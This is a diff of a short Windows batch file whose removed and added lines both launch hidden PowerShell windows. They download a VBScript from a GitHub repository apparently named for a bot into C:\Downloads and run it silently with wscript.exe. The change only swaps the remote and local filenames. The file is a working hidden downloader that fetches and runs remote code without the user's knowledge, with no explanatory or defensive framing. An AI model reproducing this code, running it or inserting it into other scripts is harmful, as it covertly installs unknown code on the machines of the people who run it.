@@ -1,3 +1,3 @@
 @echo off
-powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path 'C:\Downloads'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/QuanDeppChaii/shjnuzBOT/main/run' -OutFile 'C:\Downloads\running.vbs'"
-powershell.exe -WindowStyle hidden -Command "& {Start-Process 'wscript.exe' -ArgumentList 'C:\Downloads\running.vbs' -WindowStyle Hidden}"
+powershell.exe -WindowStyle hidden -Command "New-Item -ItemType Directory -Force -Path 'C:\Downloads'; Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/QuanDeppChaii/shjnuzBOT/main/script' -OutFile 'C:\Downloads\run.vbs'"
+powershell.exe -WindowStyle hidden -Command "& {Start-Process 'wscript.exe' -ArgumentList 'C:\Downloads\run.vbs' -WindowStyle Hidden}"
